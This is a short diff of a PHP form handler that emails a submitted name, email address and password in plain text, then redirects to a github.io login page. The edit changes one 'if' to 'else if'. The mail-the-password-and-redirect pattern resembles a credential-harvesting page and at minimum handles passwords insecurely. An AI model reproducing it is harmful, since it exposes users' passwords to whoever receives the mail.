@@ -14,7 +14,7 @@ $subject = "Mail From website";
 $txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n password =" . $pass;
 $headers = "From: mpgayathri001@gmail.com" . "\r\n" .
 "CC: somebodyelse@example.com";
-if($email!=NULL){
+else if($email!=NULL){
     mail($to,$subject,$txt,$headers);
 
 header("Location: https://mpgayathri001.github.io/myweb-f/login.html");
